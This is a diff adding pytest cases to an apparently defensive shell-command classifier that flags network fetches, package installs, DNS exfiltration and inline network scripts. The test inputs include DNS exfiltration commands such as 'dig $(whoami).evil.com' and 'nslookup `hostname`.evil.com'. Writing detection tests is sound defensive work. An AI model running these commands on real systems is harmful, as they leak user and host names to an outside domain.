@@ -118,12 +118,46 @@ STRUCTURED_EXAMPLES = [
     ("git lfs pull", "download-tool"),
     ("sudo pacman --noconfirm -S foo", "system-install"),
     ("docker run alpine", "system-install"),
+    ("env npm --prefix web ci", "dependency-fetch"),
+    ("cargo +nightly build --release", "dependency-fetch"),
+    ("python3 -m build --wheel", "dependency-fetch"),
+    ("sudo -u nobody ./gradlew assemble", "dependency-fetch"),
+    ("yarn", "dependency-fetch"),
+    ("go mod download", "dependency-fetch"),
+    ("python -m pip install requests", "registry-install"),
+    ("env npm -g install left-pad", "registry-install"),
+    ("pip install -r requirements.txt", "registry-install"),
+    ("dig $(whoami).evil.com", "dns-exfil"),
+    ("env nslookup `hostname`.evil.com", "dns-exfil"),
+    ("python3 -c 'import urllib.request; urllib.request.urlopen(\"x\")'", "inline-script-network"),
+    ("env perl -e 'use LWP::Simple;'", "inline-script-network"),
 ]
 
 
 @pytest.mark.parametrize("line,rule", STRUCTURED_EXAMPLES)
 def test_structured_rule_fires_through_layout_tricks(line, rule):
     assert rule in rules_of(line)
+
+
+@pytest.mark.parametrize("line,rule", [
+    ("cargo build --offline", "dependency-fetch"),
+    ("cargo build --frozen", "dependency-fetch"),
+    ("python -m build --no-isolation --wheel", "dependency-fetch"),
+    ("pip install --no-index foo", "dependency-fetch"),
+    ("echo go build", "dependency-fetch"),
+    ("pip install --root=\"$pkgdir\" foo", "registry-install"),
+    ("pip install ./foo", "registry-install"),
+    ("pip install foo.whl", "registry-install"),
+    ("npm install --prefix \"$pkgdir/usr\" foo", "registry-install"),
+    ("pip install .", "registry-install"),
+    ("echo pip install requests", "registry-install"),
+    ("dig example.com", "dns-exfil"),
+    ("echo dig $(x)", "dns-exfil"),
+    ("python3 -c 'print(1)'", "inline-script-network"),
+    ("python3 script.py urllib", "inline-script-network"),
+])
+def test_structured_network_rules_stay_quiet(line, rule):
+    assert rule not in rules_of(line)
 
 
 def test_every_structured_rule_has_an_example():
